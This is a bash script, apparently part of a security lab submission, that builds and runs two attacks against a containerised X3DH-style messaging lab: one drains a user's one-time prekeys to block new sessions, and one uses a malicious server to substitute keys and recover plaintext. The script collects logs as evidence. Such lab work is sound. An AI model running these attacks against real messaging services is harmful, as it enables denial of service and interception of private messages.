#!/usr/bin/env bash
# Reproduce the Attack 1 + Attack 2 evidence end-to-end on the provided lab.
# Produces:
#   results/attack1_drain.txt      (OPK inventory draining to zero -> new-session DoS)
#   results/attack2_evidence.txt   (the 3 evidence classes: forward / recover / fail)
#
# Run from the submission root:  bash scripts/run_attack12_experiments.sh
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
LAB="$ROOT/lab"
BUILD="$ROOT/attacks/build"
RES="$ROOT/results"
IMG="s4ch1n/as3:latest"
mkdir -p "$BUILD" "$RES"

echo "[*] building attack1 (static) and attack2 (static, OpenSSL)"
docker run --rm -v "$ROOT/attacks:/src" gcc:13 bash -c '
  g++ -O2 -std=c++17 -static -o /src/build/attack1 /src/attack1.cpp -lpthread 2>/dev/null
  apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq libssl-dev >/dev/null 2>&1
  g++ -O2 -std=c++17 -static -o /src/build/attack2 /src/attack2.cpp -lssl -lcrypto -lpthread -ldl 2>/dev/null' 2>/dev/null

cleanup() { docker rm -f bob alice2 carol mallory as3_server >/dev/null 2>&1; }

# =============================== ATTACK 1 ====================================
echo "[*] Attack 1 — one-time prekey exhaustion"
cleanup; docker volume rm as3b as3a as3c >/dev/null 2>&1
docker volume create as3b >/dev/null; docker volume create as3a >/dev/null; docker volume create as3c >/dev/null
docker compose -f "$LAB/docker-compose.yml" up -d as3_server >/dev/null 2>&1; sleep 2
# Bob publishes 5 OPKs then goes offline (Attack-1 scenario)
docker run -d -i --name bob --network as3net -e USER_NAME=bob -e STATE_DIR=/state -e OPK_COUNT=5 \
  -v as3b:/state --entrypoint /client "$IMG" --server-addr as3_server --port 9000 >/dev/null; sleep 3
{
  echo "=== Attack 1: Prekey Pogo (OPK exhaustion) ==="
  echo "--- Bob publishes his bundle (5 OPKs) ---"
  docker logs bob 2>&1 | grep -i published
  echo "--- Mallory (ordinary client) drains Bob's OPK inventory via fetch_bundle ---"
  docker run --rm --network as3net -v "$BUILD:/b" debian:stable-slim \
    /b/attack1 --server as3_server:9000 --target bob 2>&1
  echo "--- A legitimate NEW initiator (carol) can no longer start a session with bob ---"
  printf '1\nbob\nhi-bob\n' | timeout 15 docker run --rm -i --name carol --network as3net \
    -e USER_NAME=carol -e STATE_DIR=/state -v as3c:/state --entrypoint /client "$IMG" \
    --server-addr as3_server --port 9000 2>&1 | grep -aiE 'fetch_bundle|no one-time' | head -2
} | tee "$RES/attack1_drain.txt"

# =============================== ATTACK 2 ====================================
echo "[*] Attack 2 — malicious-server MITM (three evidence classes)"
: > "$RES/attack2_evidence.txt"
run2() {  # mode, message
  local MODE=$1 MSG=$2
  docker rm -f mallory bob alice2 >/dev/null 2>&1
  docker volume rm as3b as3a >/dev/null 2>&1; docker volume create as3b >/dev/null; docker volume create as3a >/dev/null
  docker run -d --name mallory --network as3net -v "$BUILD:/b" debian:stable-slim \
    /b/attack2 --listen 0.0.0.0:9000 --mode "$MODE" >/dev/null; sleep 1
  docker run -d -i --name bob --network as3net -e USER_NAME=bob -e STATE_DIR=/state -e OPK_COUNT=5 \
    -v as3b:/state --entrypoint /client "$IMG" --server-addr mallory --port 9000 >/dev/null; sleep 2
  printf '1\nbob\n%s\n' "$MSG" | timeout 20 docker run --rm -i --name alice2 --network as3net \
    -e USER_NAME=alice -e STATE_DIR=/state -v as3a:/state --entrypoint /client "$IMG" \
    --server-addr mallory --port 9000 >/dev/null 2>&1; sleep 3
  {
    echo "===================================================================="
    echo "MODE=$MODE   (Alice sends: \"$MSG\")"
    echo "--- Mallory (malicious server) ---"
    docker logs mallory 2>&1 | grep -aE 'SUBSTITUTED|RECOVERED|FORWARDED|honest|raw|NOT recover'
    echo "--- Bob (victim) client log ---"
    docker logs bob 2>&1 | grep -aE 'X3DH|recv <-|DECRYPT|\[alice\]' | tail -4
  } | tee -a "$RES/attack2_evidence.txt"
}
run2 honest    "hello-bob-baseline"     # message the server MERELY FORWARDS (cannot read)
run2 reencrypt "meet me at 5pm -alice"  # message whose plaintext the server RECOVERS
run2 raw       "this will not arrive"   # message that FAILS AUTHENTICATION at Bob

cleanup
echo "[*] done. Evidence in $RES/attack1_drain.txt and $RES/attack2_evidence.txt"
